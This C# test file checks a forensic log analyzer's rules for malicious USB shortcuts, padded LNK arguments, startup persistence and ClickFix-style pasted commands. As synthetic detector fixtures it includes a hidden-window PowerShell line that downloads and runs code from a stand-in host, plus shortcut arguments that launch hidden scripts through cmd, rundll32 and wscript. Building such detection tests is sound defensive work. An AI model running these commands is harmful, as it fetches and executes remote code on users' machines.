using System.IO;
using LogAnalyzer.Core.Services.Details;
using LogAnalyzer.Dfir.Analysis;
using LogAnalyzer.Dfir.Devices;
using LogAnalyzer.Dfir.FileSystem;
using LogAnalyzer.Dfir.Model;
using LogAnalyzer.Dfir.Windows.Parsers;
using Xunit;

namespace LogAnalyzer.App.Tests;

/// <summary>
/// P1 rules of research 2026-10-11 §4 (MEDIA-LNK-PAYLOAD, LNK-ARGS-PADDED, MEDIA-HIDDEN-MAILBOX, MEDIA-SAME-DROP, EXEC-FROM-REMOVABLE, PERSIST-STARTUP-FOLDER,
/// CLICKFIX-RUNMRU), each with a synthetic positive and a benign negative case, and backlog item 7 of the tool-security research (attack-like strings out of
/// the compiled assembly). Synthetic facts only: no real machine, user, path or serial. Command fixtures are assembled at run time from harmless pieces
/// (<see cref="J"/>), so this test assembly does not carry them as one string either.
/// </summary>
public class P1PayloadRulesTests
{
    private static readonly DateTime T0 = new(2026, 10, 1, 10, 0, 0, DateTimeKind.Utc);
    private static readonly DateTimeOffset P0 = new(T0, TimeSpan.Zero);
    private static int _rec;

    /// <summary>Joins pieces at run time (a params array is not folded into one literal by the compiler).</summary>
    private static string J(params string[] parts) => string.Concat(parts);

    private static TimelineEvent Ev(string channel, int id, double minute, params (string K, string V)[] f) => new()
    {
        Time = Timestamp.FromUtc(T0.AddMinutes(minute), "", "test"), Source = "EventLog:" + channel, EventId = id.ToString(), EvidenceId = "EV-1",
        Locator = $"EventRecordID={Interlocked.Increment(ref _rec)}", Summary = "t", Fields = f.ToDictionary(x => x.K, x => x.V, StringComparer.OrdinalIgnoreCase),
    };

    private static TimelineEvent Row(string source, double? minute, string process = "", string path = "", params (string K, string V)[] f) => new()
    {
        Time = minute is { } m ? Timestamp.FromUtc(T0.AddMinutes(m), "", "test") : Timestamp.Unknown(), Source = source, EvidenceId = "EV-2",
        Locator = $"row={Interlocked.Increment(ref _rec)}", Summary = "t", Process = process, Path = path, Fields = f.ToDictionary(x => x.K, x => x.V, StringComparer.OrdinalIgnoreCase),
    };

    private static TimelineEvent Lnk(string lnkPath, string target, string args, double minute = 1) =>
        Row("LNK", minute, Path.GetFileName(target), target, ("LnkPath", lnkPath), ("Arguments", args));

    private static CaseScope Classified() => new() { Network = NetworkCategory.AirGappedNetwork, Classification = ClassificationLevel.Classified };
    private static CaseScope Unclassified() => new() { Network = NetworkCategory.Connected, Classification = ClassificationLevel.Unclassified };

    private static List<Finding> Go(IEnumerable<TimelineEvent> events, AirGapFacts? facts = null, CaseScope? scope = null)
    {
        int n = 0;
        if (facts is not null && facts.EvidenceId.Length == 0) facts.EvidenceId = "EV-FACTS";
        return Wp14Rules.Run(events.ToList(), () => $"F-{++n:D4}", new Wp14Input { Scope = scope ?? Classified(), Facts = facts });
    }

    private static Finding One(List<Finding> f, string rule) => Assert.Single(f, x => x.RuleId == rule);
    private static void None(List<Finding> f, string rule) => Assert.DoesNotContain(f, x => x.RuleId == rule);

    private static MediaEntryFact Dir(string rel, bool hidden = false, bool system = false) => new() { RelativePath = rel, IsDirectory = true, Hidden = hidden, System = system };
    private static MediaEntryFact File(string rel, long size = 4096, double daysBefore = 1, bool hidden = false, string sha = "") =>
        new() { RelativePath = rel, Size = size, LastWriteUtc = P0.AddDays(-daysBefore), CreatedUtc = P0.AddDays(-daysBefore), Hidden = hidden, Sha256 = sha };
    private static MediaEntryFact Link(string rel, string target, string args = "") => new() { RelativePath = rel, Size = 1200, LastWriteUtc = P0.AddDays(-1), LnkTarget = target, LnkArguments = args };

    private static AirGapFacts Facts(params MediaListingFact[] media) => new() { CollectedUtc = P0, RemovableLetters = ["E"], MediaListings = [.. media] };
    private static MediaListingFact Medium(string letter, string serial, params MediaEntryFact[] entries) => new() { Letter = letter, Label = "STICK", DeviceSerial = serial, Entries = [.. entries] };

    private const string StartupUser = @"C:\Users\u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\";

    // ---- MEDIA-LNK-PAYLOAD ----

    [Fact]
    public void A_shortcut_on_the_medium_that_starts_a_system_interpreter_on_a_hidden_folder_is_high()
    {
        var facts = Facts(Medium("E", "AA001", Dir("_", hidden: true), File(@"_\run.vbs", hidden: true), Link("Documente.lnk", @"C:\Windows\System32\cmd.exe", @"/c start _\run.vbs & start explorer _")));
        var f = One(Go([], facts), "MEDIA-LNK-PAYLOAD");
        Assert.Equal(Severity.High, f.Severity);
        Assert.Contains("Documente.lnk", f.Title);
        Assert.Contains("cmd.exe", f.Description);
        Assert.Contains(@"_\run.vbs", f.Description);
        Assert.Contains("folder ascuns", f.Description);
        Assert.Equal("T1091", f.MitreTechniqueId);
        Assert.NotNull(f.AirGap);
    }

    [Fact]
    public void A_shortcut_event_whose_own_file_is_on_a_removable_letter_and_targets_a_proxy_program_is_reported_but_one_on_the_desktop_is_not()
    {
        var on = One(Go([Lnk(@"E:\Poze.lnk", @"C:\Windows\System32\rundll32.exe", @"E:\.cache\x.dll,Start")], Facts()), "MEDIA-LNK-PAYLOAD");
        Assert.Contains("rundll32.exe", on.Description);
        None(Go([Lnk(@"C:\Users\u\Desktop\Poze.lnk", @"C:\Windows\System32\rundll32.exe", @"shell32.dll,Control_RunDLL")], Facts()), "MEDIA-LNK-PAYLOAD");
    }

    [Fact]
    public void A_shortcut_on_the_medium_to_a_document_on_the_same_medium_is_not_a_payload()
    {
        var facts = Facts(Medium("E", "AA001", File(@"Docs\raport.pdf"), Link("raport.lnk", @"E:\Docs\raport.pdf")));
        None(Go([], facts), "MEDIA-LNK-PAYLOAD");
    }

    // ---- LNK-ARGS-PADDED ----

    [Fact]
    public void Padded_shortcut_arguments_are_high_and_the_report_shows_the_command_without_the_padding()
    {
        var args = new string(' ', 180) + "\u200B\u200B" + "\r\n" + "/c start x.vbs";
        var f = One(Go([Lnk(@"C:\Users\u\Downloads\factura.pdf.lnk", @"C:\Windows\System32\cmd.exe", args)]), "LNK-ARGS-PADDED");
        Assert.Equal(Severity.High, f.Severity);
        Assert.Contains("/c start x.vbs", f.Description);
        Assert.Contains("184", f.Description);       // 180 spaces + 2 zero-width + CR LF removed
        Assert.DoesNotContain(new string(' ', 20), f.Description);
        Assert.Equal("T1027", f.MitreTechniqueId);
    }

    [Fact]
    public void Normal_arguments_and_short_spacing_are_not_padding()
    {
        var f = Go([Lnk(@"C:\x.lnk", @"C:\Program Files\App\app.exe", "--profile  \"Implicit\"  --start"), Lnk(@"C:\y.lnk", @"C:\Program Files\App\app.exe", "")]);
        None(f, "LNK-ARGS-PADDED");
        Assert.False(LnkText.Depad("  -a  -b ").Padded);
        Assert.True(LnkText.Depad(new string('\t', 25) + "x").Padded);
    }

    [Fact]
    public void Padding_in_a_shortcut_found_on_a_medium_listing_is_reported_too()
    {
        var facts = Facts(Medium("E", "AA001", Link("CV.lnk", @"C:\Windows\System32\cmd.exe", new string(' ', 300) + "/c x.bat")));
        var f = Go([], facts);
        Assert.Contains("/c x.bat", One(f, "LNK-ARGS-PADDED").Description);
        One(f, "MEDIA-LNK-PAYLOAD");
    }

    // ---- MEDIA-HIDDEN-MAILBOX ----

    [Fact]
    public void A_hidden_folder_on_a_medium_with_many_recently_changed_documents_is_high_on_a_classified_scope_with_counts()
    {
        var entries = new List<MediaEntryFact> { Dir("$cache", hidden: true, system: true) };
        for (int i = 0; i < 12; i++) entries.Add(File($@"$cache\d{i}.docx", daysBefore: 2));
        entries.Add(File(@"$cache\old.docx", daysBefore: 400));
        var f = One(Go([], Facts(Medium("E", "AA001", [.. entries]))), "MEDIA-HIDDEN-MAILBOX");
        Assert.Equal(Severity.High, f.Severity);
        Assert.Contains("12", f.Title);
        Assert.Contains("$cache", f.Description);
        Assert.Contains("13", f.Description);           // files in the folder
        var lo = One(Go([], Facts(Medium("E", "AA001", [.. entries])), Unclassified()), "MEDIA-HIDDEN-MAILBOX");
        Assert.Equal(Severity.Medium, lo.Severity);
    }

    [Fact]
    public void A_hidden_folder_with_only_old_files_and_the_windows_own_folders_are_not_a_mailbox()
    {
        var facts = Facts(Medium("E", "AA001", Dir("x", hidden: true), File(@"x\a.docx", daysBefore: 300), Dir("System Volume Information", hidden: true, system: true), File(@"System Volume Information\IndexerVolumeGuid", daysBefore: 1)));
        None(Go([], facts), "MEDIA-HIDDEN-MAILBOX");
    }

    [Fact]
    public void A_few_recent_files_in_a_hidden_folder_are_medium()
    {
        var facts = Facts(Medium("E", "AA001", Dir("x", hidden: true), File(@"x\a.docx"), File(@"x\b.zip")));
        Assert.Equal(Severity.Medium, One(Go([], facts), "MEDIA-HIDDEN-MAILBOX").Severity);
    }

    // ---- MEDIA-SAME-DROP ----

    [Fact]
    public void The_same_file_on_two_different_media_is_reported_once_with_both_media()
    {
        var facts = Facts(Medium("E", "AA001", File("plan.pdf", 51234)), Medium("F", "BB002", File(@"arh\plan.pdf", 51234)));
        var f = One(Go([], facts), "MEDIA-SAME-DROP");
        Assert.Equal(Severity.Medium, f.Severity);
        Assert.Contains("AA001", f.Description);
        Assert.Contains("BB002", f.Description);
        Assert.Contains("mai multe suporturi", f.Title);
    }

    [Fact]
    public void A_file_on_a_medium_with_the_same_hash_as_one_in_downloads_is_reported()
    {
        var sha = new string('c', 64);
        var facts = Facts(Medium("E", "AA001", File("setup_x.bin", 90000, sha: sha)));
        facts.ProfileFiles = [new() { Profile = "u", Folder = "Downloads", Name = "alt_nume.bin", Size = 90000, Sha256 = sha, LastWriteUtc = P0.AddDays(-1) }];
        var f = One(Go([], facts), "MEDIA-SAME-DROP");
        Assert.Contains("Downloads", f.Description);
        Assert.Contains("SHA-256", f.Description);
    }

    [Fact]
    public void Same_name_with_a_different_size_or_a_tiny_file_is_not_the_same_drop()
    {
        var facts = Facts(Medium("E", "AA001", File("plan.pdf", 51234), File("desktop.ini", 100)), Medium("F", "BB002", File("plan.pdf", 51235), File("desktop.ini", 100)));
        None(Go([], facts), "MEDIA-SAME-DROP");
    }

    // ---- EXEC-FROM-REMOVABLE ----

    [Fact]
    public void A_process_start_from_a_removable_letter_is_high_execution()
    {
        var f = One(Go([Ev("Security", 4688, 3, ("NewProcessName", @"E:\tools\x.exe"), ("SubjectUserName", "u"))], Facts()), "EXEC-FROM-REMOVABLE");
        Assert.Equal(Severity.High, f.Severity);
        Assert.Equal(SemanticType.Execution, f.SemanticType);
        Assert.Contains(@"E:\tools\x.exe", f.Description);
        Assert.Equal("T1091", f.MitreTechniqueId);
    }

    [Fact]
    public void A_prefetch_path_on_the_volume_of_a_removable_medium_is_execution_from_removable()
    {
        var facts = Facts(Medium("E", "AA001"));
        facts.MediaListings[0].VolumeSerial = "AB12CD34";
        var f = One(Go([Row("Prefetch", 5, "X.EXE", @"\VOLUME{01d9c3a1b2c3d4e5-ab12cd34}\TOOLS\X.EXE")], facts), "EXEC-FROM-REMOVABLE");
        Assert.Contains("X.EXE", f.Description);
        Assert.Equal(SemanticType.Execution, f.SemanticType);
    }

    [Fact]
    public void Amcache_alone_on_a_removable_letter_is_presence_and_medium_and_a_fixed_drive_is_nothing()
    {
        var f = One(Go([Row("Amcache", 5, "x.exe", @"E:\x.exe")], Facts()), "EXEC-FROM-REMOVABLE");
        Assert.Equal(SemanticType.Presence, f.SemanticType);
        Assert.Equal(Severity.Medium, f.Severity);
        None(Go([Ev("Security", 4688, 3, ("NewProcessName", @"C:\Windows\System32\notepad.exe")), Row("Prefetch", 5, "X.EXE", @"\VOLUME{01d9c3a1b2c3d4e5-00000001}\TOOLS\X.EXE")], Facts()), "EXEC-FROM-REMOVABLE");
    }

    [Fact]
    public void Without_any_known_removable_letter_or_volume_the_rule_stays_silent()
    {
        None(Go([Ev("Security", 4688, 3, ("NewProcessName", @"E:\tools\x.exe"))]), "EXEC-FROM-REMOVABLE");
    }

    // ---- PERSIST-STARTUP-FOLDER ----

    [Fact]
    public void A_new_startup_shortcut_to_an_unsigned_program_in_a_user_writable_folder_is_high()
    {
        var facts = new AirGapFacts
        {
            CollectedUtc = P0,
            StartupEntries = [new() { Scope = "utilizator", Profile = "u", Path = StartupUser + "upd.lnk", CreatedUtc = P0.AddDays(-2), LnkTarget = @"C:\Users\u\AppData\Local\Temp\upd.exe", TargetSigned = false }],
        };
        var f = One(Go([], facts), "PERSIST-STARTUP-FOLDER");
        Assert.Equal(Severity.High, f.Severity);
        Assert.Contains("upd.lnk", f.Title);
        Assert.Contains(@"C:\Users\u\AppData\Local\Temp\upd.exe", f.Description);
        Assert.Equal("T1547.001", f.MitreTechniqueId);
    }

    [Fact]
    public void An_old_signed_vendor_shortcut_in_startup_is_low_and_desktop_ini_is_ignored()
    {
        var facts = new AirGapFacts
        {
            CollectedUtc = P0,
            StartupEntries =
            [
                new() { Scope = "comun", Path = @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Vendor.lnk", CreatedUtc = P0.AddYears(-2), LnkTarget = @"C:\Program Files\Vendor\tray.exe", TargetSigned = true },
                new() { Scope = "comun", Path = @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\desktop.ini", CreatedUtc = P0.AddDays(-1) },
            ],
        };
        var f = One(Go([], facts), "PERSIST-STARTUP-FOLDER");
        Assert.Equal(Severity.Low, f.Severity);
        Assert.DoesNotContain("desktop.ini", f.Title);
    }

    [Fact]
    public void A_shortcut_event_located_in_a_startup_folder_is_reported_from_imported_evidence()
    {
        var f = One(Go([Lnk(StartupUser + "sync.lnk", @"C:\Windows\System32\wscript.exe", @"C:\Users\u\AppData\Roaming\s.vbs")]), "PERSIST-STARTUP-FOLDER");
        Assert.Equal(Severity.High, f.Severity);
        Assert.Contains("wscript.exe", f.Description);
    }

    // ---- CLICKFIX-RUNMRU ----

    private static string PastedCommand() => J("power", "shell -w h", "idden -nop -c \"i", "ex (ir", "m https://example.test/a)\"");

    private static TimelineEvent RunMru(string command, double? minute, int position = 0) =>
        Row("RunMRU", minute, "", "", ("Command", command), ("MruPosition", position.ToString()), ("Account", "u"), ("ValueName", "a"));

    [Fact]
    public void A_pasted_interpreter_command_in_runmru_followed_by_a_powershell_script_block_is_high()
    {
        var f = One(Go([RunMru(PastedCommand(), 10), Ev("Microsoft-Windows-PowerShell/Operational", 4104, 12, ("ScriptBlockText", "Write-Output 1"))]), "CLICKFIX-RUNMRU");
        Assert.Equal(Severity.High, f.Severity);
        Assert.Equal(SemanticType.Correlation, f.SemanticType);
        Assert.Contains("ClickFix", f.Description);
        Assert.Contains("Win+R", f.Description);
        Assert.Contains("fereastră ascunsă", f.Description);
        Assert.Equal("T1204.004", f.MitreTechniqueId);
        Assert.True(f.SupportingEvidence.Count >= 2);
    }

    [Fact]
    public void A_pasted_command_without_a_following_script_block_is_medium_and_an_ordinary_run_entry_is_nothing()
    {
        var f = One(Go([RunMru(PastedCommand(), 10), Ev("Microsoft-Windows-PowerShell/Operational", 4104, 30, ("ScriptBlockText", "x"))]), "CLICKFIX-RUNMRU");
        Assert.Equal(Severity.Medium, f.Severity);
        Assert.Equal(SemanticType.Observation, f.SemanticType);
        var benign = Go([RunMru("notepad", 10), RunMru("powershell", null, 1), RunMru(@"\\server\share", null, 2), Row("TypedPaths", 9, "", "", ("Command", @"C:\Users\u\Documents"))]);
        None(benign, "CLICKFIX-RUNMRU");
    }

    [Fact]
    public void A_filefix_path_typed_in_the_explorer_address_bar_is_reported_from_typedpaths()
    {
        var typed = J("power", "shell -c \"i", "wr https://example.test/x\"", new string(' ', 60), "# C:\\share\\raport.docx");
        var f = One(Go([Row("TypedPaths", 9, "", "", ("Command", typed), ("ValueName", "url1"))]), "CLICKFIX-RUNMRU");
        Assert.Contains("bara de adrese", f.Description);
        Assert.DoesNotContain(new string(' ', 20), f.Description);
    }

    [Fact]
    public void The_user_hive_parser_emits_runmru_in_mru_order_and_typedpaths_with_the_key_time_on_the_newest_entry()
    {
        var written = new DateTime(2026, 9, 30, 8, 0, 0, DateTimeKind.Utc);
        var root = new Regf.Key("ROOT", written);
        root.Sub(@"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU").Value("a", Regf.String, "notepad\\1").Value("b", Regf.String, PastedCommand() + "\\1").Value("MRUList", Regf.String, "ba");
        root.Sub(@"Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths").Value("url1", Regf.String, @"C:\Users\u\Documents").Value("url2", Regf.String, @"D:\");
        var dir = Path.Combine(Path.GetTempPath(), "la_p1_" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(dir);
        try
        {
            var p = Path.Combine(dir, "NTUSER.DAT");
            System.IO.File.WriteAllBytes(p, Regf.Build(root, "NTUSER.DAT"));
            var sink = new ListSink();
            var r = new UserHiveParser().Parse(new EvidenceItem { EvidenceId = "EV-H", CaseId = "C", Source = "ntuser_hive", SourceType = "ntuser_hive", StoredPath = p, OriginalPath = @"C:\Users\u\NTUSER.DAT" }, p, sink, default);
            Assert.Equal(EvidenceStatus.Success, r.Status);
            var mru = sink.Events.Where(e => e.Source == "RunMRU").OrderBy(e => int.Parse(e.Fields["MruPosition"])).ToList();
            Assert.Equal(2, mru.Count);
            Assert.Equal(PastedCommand(), mru[0].Fields["Command"]);
            Assert.Equal("notepad", mru[1].Fields["Command"]);
            Assert.Equal(written, mru[0].Time.Utc!.Value.UtcDateTime);
            Assert.Null(mru[1].Time.Utc);
            Assert.Equal("u", mru[0].Fields["Account"]);
            var typed = sink.Events.Where(e => e.Source == "TypedPaths").ToList();
            Assert.Equal(2, typed.Count);
            Assert.Contains(typed, e => e.Fields["Command"] == @"C:\Users\u\Documents" && e.Time.Utc is not null);
            One(Go(sink.Events), "CLICKFIX-RUNMRU");
        }
        finally { Directory.Delete(dir, true); }
    }

    // ---- parsers and the medium listing ----

    [Fact]
    public void The_lnk_parser_keeps_where_the_link_was_and_shows_padded_arguments_without_the_padding()
    {
        var dir = Path.Combine(Path.GetTempPath(), "la_p1_" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(dir);
        try
        {
            var p = Path.Combine(dir, "Poze.lnk");
            System.IO.File.WriteAllBytes(p, TestArtifacts.Lnk(@"C:\Windows\System32\cmd.exe", new string(' ', 120) + "/c start a.bat"));
            var sink = new ListSink();
            new LnkParser().Parse(new EvidenceItem { EvidenceId = "EV-L", CaseId = "C", Source = "lnk", SourceType = "lnk", StoredPath = p, OriginalPath = @"E:\Poze.lnk" }, p, sink, default);
            var e = Assert.Single(sink.Events);
            Assert.Equal(@"E:\Poze.lnk", e.Fields["LnkPath"]);
            Assert.Equal(new string(' ', 120) + "/c start a.bat", e.Fields["Arguments"]);   // evidence untouched
            Assert.Contains("/c start a.bat", e.Summary);
            Assert.DoesNotContain(new string(' ', 20), e.Summary);
        }
        finally { Directory.Delete(dir, true); }
    }

    [Fact]
    public void The_medium_listing_decodes_shortcuts_marks_hidden_folders_and_the_quick_check_names_the_shortcut_target()
    {
        var dir = Path.Combine(Path.GetTempPath(), "la_p1_" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(dir);
        try
        {
            var hidden = Directory.CreateDirectory(Path.Combine(dir, "_"));
            hidden.Attributes |= FileAttributes.Hidden;
            System.IO.File.WriteAllText(Path.Combine(hidden.FullName, "a.docx"), "x");
            System.IO.File.WriteAllBytes(Path.Combine(dir, "Documente.lnk"), TestArtifacts.Lnk(@"C:\Windows\System32\cmd.exe", @"/c start _\a.vbs"));
            var l = RemovableMediaInspector.List(dir, "STICK");
            Assert.Contains(l.Entries, x => x.IsDirectory && x.Hidden && x.RelativePath == "_");
            Assert.Contains(l.Entries, x => x.RelativePath == @"_\a.docx" && x.Sha256.Length == 64);
            var link = Assert.Single(l.Entries, x => x.RelativePath == "Documente.lnk");
            Assert.Equal(@"C:\Windows\System32\cmd.exe", link.LnkTarget);
            Assert.Equal(@"/c start _\a.vbs", link.LnkArguments);
            var r = RemovableMediaInspector.Inspect(dir, "STICK");
            Assert.Contains(r.Findings, x => x.Path == "Documente.lnk" && x.Message.Contains("cmd.exe"));
        }
        finally
        {
            foreach (var d in Directory.EnumerateDirectories(dir)) new DirectoryInfo(d).Attributes = FileAttributes.Directory;
            Directory.Delete(dir, true);
        }
    }

    // ---- contracts, overclaim, sufficiency, MITRE ----

    private static readonly string[] Rules = ["MEDIA-LNK-PAYLOAD", "LNK-ARGS-PADDED", "MEDIA-HIDDEN-MAILBOX", "MEDIA-SAME-DROP", "EXEC-FROM-REMOVABLE", "PERSIST-STARTUP-FOLDER", "CLICKFIX-RUNMRU"];

    private static (List<TimelineEvent> Events, AirGapFacts Facts) All()
    {
        var entries = new List<MediaEntryFact> { Dir("$c", hidden: true), Link("CV.lnk", @"C:\Windows\System32\cmd.exe", new string(' ', 200) + @"/c $c\x.bat"), File("plan.pdf", 50000) };
        for (int i = 0; i < 3; i++) entries.Add(File($@"$c\d{i}.docx"));
        var facts = Facts(Medium("E", "AA001", [.. entries]), Medium("F", "BB002", File("plan.pdf", 50000)));
        facts.StartupEntries = [new() { Scope = "utilizator", Profile = "u", Path = StartupUser + "upd.lnk", CreatedUtc = P0.AddDays(-2), LnkTarget = @"C:\Users\u\AppData\Local\Temp\upd.exe", TargetSigned = false }];
        var events = new List<TimelineEvent>
        {
            Ev("Security", 4688, 3, ("NewProcessName", @"E:\tools\x.exe")), RunMru(PastedCommand(), 10),
            Ev("Microsoft-Windows-PowerShell/Operational", 4104, 11, ("ScriptBlockText", "Write-Output 1")),
        };
        return (events, facts);
    }

    [Fact]
    public void Every_p1_rule_has_a_contract_a_described_technique_and_findings_pass_the_overclaim_check()
    {
        var (events, facts) = All();
        var found = Go(events, facts);
        foreach (var r in Rules) Assert.Contains(found, f => f.RuleId == r);
        foreach (var r in Rules)
        {
            var c = RuleContracts.For(r);
            Assert.NotNull(c);
            Assert.EndsWith("Wp14Rules", c!.Producer);
            Assert.NotEmpty(c.Limitations); Assert.NotEmpty(c.MissingEvidence); Assert.NotEmpty(c.NextSteps); Assert.True(c.Meaning.Length > 20);
        }
        var enriched = FindingContract.Enrich(found).Where(f => Rules.Contains(f.RuleId)).ToList();
        foreach (var f in enriched)
        {
            Assert.True(f.HasSemanticType, f.RuleId);
            Assert.NotEmpty(f.Limitations); Assert.NotEmpty(f.AlternativeExplanations); Assert.NotEmpty(f.SupportingEvidence); Assert.NotEmpty(f.ClassificationReason);
            Assert.Empty(AntiOverclaim.Violations(f));
            Assert.True(f.Severity <= Severity.High, f.RuleId);
            Assert.NotEqual("", f.MitreTechniqueId);
            Assert.DoesNotContain("nu are încă o descriere", ItemMeaning.Technique(f.MitreTechniqueId));
            if (f.AirGap is not null) Assert.Contains(f.AirGap.Subcategory, Wp14Data.Default.Subcategories);
        }
    }

    [Fact]
    public void The_declared_semantic_type_of_every_p1_finding_is_supported_by_the_cited_artifacts()
    {
        var (events, facts) = All();
        foreach (var f in Go(events, facts).Where(f => Rules.Contains(f.RuleId)))
        {
            var refs = f.SupportingEvidence.Select(r =>
            {
                if (r.EvidenceId == "EV-FACTS") return new LogAnalyzer.Verification.ResolvedRef(r, null, [], "airgap_facts", "airgap_facts", false);
                var e = events.First(x => x.EvidenceId == r.EvidenceId && x.Locator == r.Locator);
                var row = new LogAnalyzer.Verification.TimelineRow(e.Time.Utc, e.TimeSemantics, e.Source, e.EventId, e.Path, e.Process, e.Summary, e.EvidenceId, e.Locator, "");
                var kind = e.Source.StartsWith("EventLog:", StringComparison.Ordinal) && e.EventId.Length > 0 ? $"{e.Source} {e.EventId}" : e.Source;
                return new LogAnalyzer.Verification.ResolvedRef(r, null, [row], e.Source, kind, true);
            }).ToList();
            var res = LogAnalyzer.Verification.Checks.Sufficiency(f, refs);
            Assert.True(res.Outcome != LogAnalyzer.Verification.CheckOutcome.Fail, $"{f.RuleId} ({f.SemanticType.ToSpec()}): {res.Reason}");
        }
    }

    [Fact]
    public void Facts_with_the_new_listings_round_trip_through_json()
    {
        var (_, facts) = All();
        var back = AirGapFacts.FromJson(facts.ToJson());
        Assert.Equal(2, back.MediaListings.Count);
        Assert.Contains(back.MediaListings[0].Entries, e => e.LnkTarget.EndsWith("cmd.exe"));
        Assert.False(Assert.Single(back.StartupEntries).TargetSigned);
    }

    // ---- backlog item 7: attack-like strings out of the compiled assembly ----

    private static string RepoFile(params string[] parts)
    {
        string root = AppContext.BaseDirectory;
        while (!System.IO.File.Exists(Path.Combine(root, "LogAnalyzer.slnx"))) root = Path.GetDirectoryName(root)!;
        return Path.Combine([root, .. parts]);
    }

    [Fact]
    public void The_shipped_detection_lists_read_back_exactly_as_the_source_files()
    {
        foreach (var name in DataPack.AllowedFiles)
            Assert.Equal(System.IO.File.ReadAllText(RepoFile("LogAnalyzer.Dfir.Core", "Analysis", "Data", name)).TrimStart('\uFEFF'), ShippedData.ReadEmbedded(name).TrimStart('\uFEFF'));
    }

    [Fact]
    public void The_compiled_dfir_assembly_does_not_carry_the_command_patterns_of_the_detection_lists()
    {
        var dll = System.IO.File.ReadAllBytes(typeof(ShippedData).Assembly.Location);
        var needles = Wp11Data.Default.Lists.Vss.CommandPatterns.Select(p => p.Regex)
            .Concat(Wp11Data.Default.Lists.Powershell.Keywords.Select(k => k.Text).Where(t => t.Length >= 8))
            .Concat(Wp14Data.Default.Payload.ClickFixPatterns.Select(p => p.Regex))
            .Distinct().ToList();
        Assert.True(needles.Count >= 10, $"only {needles.Count} patterns loaded");
        var found = needles.Where(n => Contains(dll, System.Text.Encoding.UTF8.GetBytes(n)) || Contains(dll, System.Text.Encoding.Unicode.GetBytes(n))).ToList();
        Assert.True(found.Count == 0, "raw patterns in the compiled assembly: " + string.Join(" | ", found));
    }

    private static bool Contains(byte[] hay, byte[] needle) => hay.AsSpan().IndexOf(needle) >= 0;
}
